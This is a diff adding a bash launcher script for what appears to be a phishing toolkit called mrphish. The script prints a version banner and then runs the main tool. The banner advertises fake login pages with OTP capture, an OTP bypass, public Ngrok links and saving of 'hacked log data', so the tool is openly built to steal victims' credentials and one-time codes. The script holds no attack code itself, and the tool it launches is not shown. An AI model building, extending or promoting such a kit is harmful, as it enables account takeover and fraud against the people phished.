@@ -1,0 +1,34 @@
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo -e "\e[96m      |-----------------------[V 1.2]-----------------------|"
+echo -e "\e[96m      |----------------------\e[92mUPDATE V1.2\e[96m--------------------|"
+echo -e "\e[96m      |-----------------------------------------------------|"
+echo -e "\e[96m      |                                                     |"
+echo -e "\e[96m      |            > 50+ latest pages with otp options      |"
+echo -e "\e[96m      |            > 5+ categories most demanding           |"
+echo -e "\e[96m      |            > Ngrok time removed, link works         |"
+echo -e "\e[96m      |            > Optimized pages and interface          |"
+echo -e "\e[96m      |            > Latest otp bypass with java timer      |"
+echo -e "\e[96m      |            > Hacked log data save feature           |"
+echo -e "\e[96m      |            > Sound alert mode                       |"
+echo -e "\e[96m      |            > New interface neon mode                |"
+echo -e "\e[96m      |                                                     |"
+echo -e "\e[96m      |-----------------------------------------------------|"
+echo -e "\e[96m      |-----------------------\e[91mFEATURES\e[96m----------------------|"            
+echo -e "\e[96m      |-----------------------------------------------------|"
+sleep 10.0
+echo
+echo
+echo
+echo
+echo
+echo
+cd $HOME/mrphish
+bash mrphish
